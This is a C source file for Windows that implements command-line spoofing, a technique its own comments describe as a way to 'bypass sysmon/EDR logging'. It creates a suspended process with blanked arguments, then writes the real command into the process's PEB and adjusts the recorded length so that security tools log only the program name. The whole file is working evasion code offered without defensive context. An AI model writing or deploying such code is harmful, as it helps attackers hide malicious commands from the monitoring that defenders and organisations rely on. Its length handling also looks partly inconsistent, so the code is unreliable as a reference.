#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winternl.h>
#include <stddef.h>

BOOL executeCommandWithEvasion(const char *command);

// Replace everything after the first space with spaces to spoof the command line
void replaceArgumentsWithSpaces(const char *original, char *modified) {
    const char *firstSpace = strchr(original, ' ');
    if (firstSpace != NULL) {
        size_t length = firstSpace - original + 1;
        strncpy(modified, original, length);
        memset(modified + length, ' ', strlen(original) - length);
        modified[strlen(original)] = '\0';
    } else {
        strcpy(modified, original);
    }
}

// Execute a command with cmdline evasion to bypass sysmon/EDR logging
// Returns TRUE on success, FALSE on failure
BOOL executeCommandWithEvasion(const char *command) {
    BOOL status = FALSE;
    wchar_t *realCmdlineW = NULL;
    wchar_t *spoofedCmdlineW = NULL;
    STARTUPINFOEX si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    if (!command || strlen(command) == 0) {
        return FALSE;
    }

    // Create spoofed cmdline (everything after first space becomes spaces)
    char spoofedCmdline[MAX_PATH];
    replaceArgumentsWithSpaces(command, spoofedCmdline);

    // Convert real command to wide character string
    int realCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, command, -1, NULL, 0);
    realCmdlineW = (wchar_t *)malloc(realCmdlineLen * sizeof(wchar_t));
    if (!realCmdlineW) {
        goto cleanup;
    }
    MultiByteToWideChar(CP_UTF8, 0, command, -1, realCmdlineW, realCmdlineLen);

    // Convert spoofed cmdline to wide character string
    int spoofedCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, spoofedCmdline, -1, NULL, 0);
    spoofedCmdlineW = (wchar_t *)malloc(spoofedCmdlineLen * sizeof(wchar_t));
    if (!spoofedCmdlineW) {
        goto cleanup;
    }
    MultiByteToWideChar(CP_UTF8, 0, spoofedCmdline, -1, spoofedCmdlineW, spoofedCmdlineLen);

    // Create process in suspended state with spoofed cmdline
    if (!CreateProcessA(NULL, spoofedCmdline, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi)) {
        goto cleanup;
    }

    // Query process basic information to get PEB address
    PROCESS_BASIC_INFORMATION pbi;
    ULONG ret;
    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ret) != 0) {
        goto cleanup;
    }

    // Read the PEB structure from remote process
    PEB peb;
    if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
        goto cleanup;
    }

    // Read the RTL_USER_PROCESS_PARAMETERS structure
    RTL_USER_PROCESS_PARAMETERS procParams;
    if (!ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), NULL)) {
        goto cleanup;
    }

    // Overwrite the command line with the real command
    if (!WriteProcessMemory(pi.hProcess, procParams.CommandLine.Buffer, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
        goto cleanup;
    }

    // Calculate the address of the Length field in the UNICODE_STRING structure
    PBYTE lengthAddress = (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine) + offsetof(UNICODE_STRING, Length);
    
    // Update the length to match the spoofed command (e.g., "cmd.exe" only)
    USHORT newLength = (wcslen(spoofedCmdlineW) - 1) * sizeof(wchar_t);  // Exclude null terminator
    
    // Write the new length to hide the real arguments
    if (!WriteProcessMemory(pi.hProcess, lengthAddress, &newLength, sizeof(USHORT), NULL)) {
        goto cleanup;
    }

    // Resume the main thread to execute the process
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        goto cleanup;
    }

    status = TRUE;

cleanup:
    if (realCmdlineW) free(realCmdlineW);
    if (spoofedCmdlineW) free(spoofedCmdlineW);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    
    return status;
}
